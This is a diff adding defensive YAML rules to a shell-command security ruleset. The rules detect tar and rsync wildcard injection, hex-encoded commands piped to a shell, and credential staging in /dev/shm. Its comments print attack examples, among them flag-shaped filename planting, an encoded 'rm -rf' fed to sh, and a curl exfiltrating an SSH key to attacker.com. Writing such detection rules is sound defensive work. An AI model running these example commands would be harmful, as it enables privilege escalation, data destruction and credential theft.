@@ -3055,3 +3055,176 @@ rules:
     decision: "AUDIT"
     confidence: 0.75
     reason: "exec with numeric file descriptor redirect — may be used for covert channels, sensitive file access, or network connections via /dev/tcp. Auditing for review."
+
+  # ==========================================================================
+  # Wildcard Injection via Filename-to-Flag Expansion
+  # ==========================================================================
+  #
+  # Unix glob expansion (*) happens BEFORE the target command parses its args.
+  # An attacker creates files whose names look like command-line flags:
+  #
+  #   touch -- '--checkpoint=1' '--checkpoint-action=exec=sh payload.sh'
+  #   tar cf archive.tar *          ← glob expands filenames into tar flags
+  #
+  # tar's --checkpoint-action=exec= flag runs an arbitrary command at each
+  # checkpoint. rsync's -e flag specifies a remote shell command. Both are
+  # well-known CTF/pentest techniques (HackTricks, Vulnhub) but are rarely
+  # caught by runtime security tools because the tar/rsync command itself
+  # looks completely benign — only the file-creation step reveals the intent.
+  #
+  # We detect the PLANTING step (touch/echo creating flag-shaped filenames)
+  # rather than the execution step, because the execution is indistinguishable
+  # from a normal tar/rsync invocation.
+  #
+  # CWE-88 (Improper Neutralization of Argument Delimiters),
+  # MITRE T1059.004, T1036.
+
+  # --- BLOCK: tar checkpoint-action wildcard injection (touch/echo planting) ---
+  - id: "ts-block-wildcard-inject-checkpoint"
+    taxonomy: "privilege-escalation/command-execution/wildcard-injection"
+    match:
+      command_regex: "(touch|echo\\s*>|printf\\s*>|cat\\s*>)\\s+.*--checkpoint-action"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "Creating a file named '--checkpoint-action=...' — tar wildcard injection. When tar operates on *, glob expansion turns this filename into a flag that executes arbitrary commands at each checkpoint. CWE-88, MITRE T1059.004."
+
+  # --- BLOCK: tar checkpoint marker file (companion to checkpoint-action) ---
+  - id: "ts-block-wildcard-inject-checkpoint-marker"
+    taxonomy: "privilege-escalation/command-execution/wildcard-injection"
+    match:
+      command_regex: "(touch|echo\\s*>|printf\\s*>|cat\\s*>)\\s+.*--checkpoint="
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "Creating a file named '--checkpoint=N' — tar wildcard injection marker. Used alongside --checkpoint-action to trigger command execution during tar operations. CWE-88."
+
+  # --- BLOCK: rsync -e shell wildcard injection ---
+  - id: "ts-block-wildcard-inject-rsync-shell"
+    taxonomy: "privilege-escalation/command-execution/wildcard-injection"
+    match:
+      command_regex: "(touch|echo\\s*>|printf\\s*>|cat\\s*>)\\s+.*-e\\s+sh\\b"
+    decision: "BLOCK"
+    confidence: 0.90
+    reason: "Creating a file named '-e sh ...' — rsync wildcard injection. When rsync operates on *, this filename becomes the -e flag specifying a remote shell command. CWE-88."
+
+  # --- BLOCK: --reference= wildcard injection for chown/chmod ---
+  - id: "ts-block-wildcard-inject-reference"
+    taxonomy: "privilege-escalation/command-execution/wildcard-injection"
+    match:
+      command_regex: "(touch|echo\\s*>|printf\\s*>|cat\\s*>)\\s+.*--reference=/(etc/(shadow|passwd|sudoers)|root/)"
+    decision: "BLOCK"
+    confidence: 0.92
+    reason: "Creating a file named '--reference=/etc/shadow' — chown/chmod wildcard injection. Glob expansion turns this into a flag that copies permissions from a privileged file. CWE-88."
+
+  # ==========================================================================
+  # printf/echo Hex Command Construction → Shell Execution
+  # ==========================================================================
+  #
+  # ANSI-C quoting detection ($'\xNN') does NOT catch printf-based hex encoding:
+  #
+  #   printf '\x72\x6d\x20\x2d\x72\x66' | sh     ← "rm -rf" decoded and executed
+  #   eval "$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')"
+  #   echo -e '\x63\x75\x72\x6c' | bash
+  #
+  # printf with hex escapes piped to a shell or wrapped in eval/command-substitution
+  # is functionally equivalent to ANSI-C evasion but uses a completely different
+  # syntax path. This is a significant detection gap.
+  #
+  # MITRE T1027.004 (Obfuscated Files or Information: Compile After Delivery),
+  # CWE-78, CWE-116.
+
+  # --- BLOCK: printf with hex escapes piped to shell interpreter ---
+  - id: "ts-block-printf-hex-pipe-shell"
+    taxonomy: "unauthorized-execution/remote-code-exec/printf-command-construction"
+    match:
+      command_regex: "printf\\s+['\"].*\\\\x[0-9a-fA-F]{2}.*['\"]\\s*\\|\\s*(sh|bash|zsh|dash|ksh|fish)"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "printf with hex escape sequences piped to a shell interpreter — constructs and executes encoded commands, evading ANSI-C quoting detection. MITRE T1027.004."
+
+  # --- BLOCK: echo -e with hex escapes piped to shell interpreter ---
+  - id: "ts-block-echo-hex-pipe-shell"
+    taxonomy: "unauthorized-execution/remote-code-exec/printf-command-construction"
+    match:
+      command_regex: "echo\\s+-[neE]+\\s+['\"].*\\\\x[0-9a-fA-F]{2}.*['\"]\\s*\\|\\s*(sh|bash|zsh|dash|ksh|fish)"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "echo -e with hex escape sequences piped to a shell — decodes hex bytes and executes the result as a command. MITRE T1027.004."
+
+  # --- BLOCK: eval wrapping printf with hex escapes ---
+  - id: "ts-block-printf-hex-eval"
+    taxonomy: "unauthorized-execution/remote-code-exec/printf-command-construction"
+    match:
+      command_regex: "eval\\s+.*\\$\\(printf\\s+['\"].*\\\\x[0-9a-fA-F]{2}"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "eval executing command-substituted printf with hex escapes — decodes and evaluates an obfuscated command string. MITRE T1027.004."
+
+  # --- BLOCK: printf with octal escapes piped to shell ---
+  - id: "ts-block-printf-octal-pipe-shell"
+    taxonomy: "unauthorized-execution/remote-code-exec/printf-command-construction"
+    match:
+      command_regex: "printf\\s+['\"].*\\\\0[0-7]{2,3}.*['\"]\\s*\\|\\s*(sh|bash|zsh|dash|ksh|fish)"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "printf with octal escape sequences piped to a shell — constructs commands from octal-encoded bytes. MITRE T1027.004."
+
+  # --- AUDIT: printf with hex escapes in command substitution (no pipe) ---
+  - id: "ts-audit-printf-hex-cmdsub"
+    taxonomy: "unauthorized-execution/remote-code-exec/printf-command-construction"
+    match:
+      command_regex: "\\$\\(printf\\s+['\"].*\\\\x[0-9a-fA-F]{2}"
+    decision: "AUDIT"
+    confidence: 0.80
+    reason: "printf with hex escapes inside command substitution — may construct executable strings dynamically. Auditing because command substitution in non-eval context has legitimate uses (ANSI color codes). MITRE T1027.004."
+
+  # ==========================================================================
+  # /dev/shm Credential Staging
+  # ==========================================================================
+  #
+  # /dev/shm (POSIX shared memory, tmpfs) is world-readable, RAM-only, leaves
+  # no disk forensic trace, and is cleared on reboot. Copying credentials there
+  # is a classic two-stage exfiltration prep:
+  #
+  #   cp ~/.ssh/id_rsa /dev/shm/.k          ← stage 1: credential to shm
+  #   curl -d @/dev/shm/.k attacker.com     ← stage 2: exfiltrate
+  #
+  # Existing rules catch /dev/shm in LD_PRELOAD and HOME redirect contexts,
+  # but NOT direct credential-to-shm copies. This fills that gap.
+  #
+  # MITRE T1074.001 (Local Data Staging), CWE-312, CWE-538.
+
+  # --- BLOCK: cp/mv credential files to /dev/shm ---
+  - id: "ts-block-shm-credential-stage"
+    taxonomy: "data-exfiltration/encoded-exfil/shm-credential-staging"
+    match:
+      command_regex: "(cp|mv|rsync|scp)(\\s+-\\S+)*\\s+.*(\\.(ssh|aws|gnupg|kube)|/etc/(shadow|passwd|sudoers)|id_rsa|id_ed25519|credentials|\\.(env|pem|key|p12|pfx|jks))\\S*\\s+(/dev/shm/|/run/shm/)"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "Copying credential or sensitive file to /dev/shm — data staging in world-readable tmpfs for later exfiltration. RAM-only storage leaves no disk forensic trace. MITRE T1074.001."
+
+  # --- BLOCK: tar/zip archiving sensitive dirs into /dev/shm ---
+  - id: "ts-block-shm-archive-sensitive"
+    taxonomy: "data-exfiltration/encoded-exfil/shm-credential-staging"
+    match:
+      command_regex: "(tar|zip|7z|gzip)(\\s+-?\\S+)*\\s+(/dev/shm/|/run/shm/)\\S*\\s+.*(\\.(ssh|aws|gnupg|kube)|/etc/(shadow|passwd|sudoers)|~|\\.env)"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "Archiving sensitive files/directories into /dev/shm — compresses credentials into a world-readable tmpfs staging area for bulk exfiltration. MITRE T1074.001."
+
+  # --- BLOCK: redirect sensitive file content to /dev/shm ---
+  - id: "ts-block-shm-redirect-sensitive"
+    taxonomy: "data-exfiltration/encoded-exfil/shm-credential-staging"
+    match:
+      command_regex: "(cat|head|tail|strings|base64)(\\s+-\\S+)*\\s+.*(\\.(ssh|aws|gnupg|kube)|/etc/(shadow|passwd|sudoers)|id_rsa|id_ed25519|credentials|\\.(env|pem|key))\\S*\\s+>+\\s*(/dev/shm/|/run/shm/)"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "Redirecting sensitive file content to /dev/shm — stages credentials in world-readable shared memory. RAM-only, cleared on reboot, evades disk forensics. MITRE T1074.001."
+
+  # --- AUDIT: any write to /dev/shm of a dotfile (hidden file) ---
+  - id: "ts-audit-shm-hidden-file"
+    taxonomy: "data-exfiltration/encoded-exfil/shm-credential-staging"
+    match:
+      command_regex: "(cp|mv|tee|cat|dd)\\b.*>?\\s*(/dev/shm/|/run/shm/)\\.[a-zA-Z]"
+    decision: "AUDIT"
+    confidence: 0.75
+    reason: "Writing a hidden (dot-prefixed) file to /dev/shm — hidden files in shared memory are a common staging tactic to avoid casual detection. Auditing for review. MITRE T1074.001."
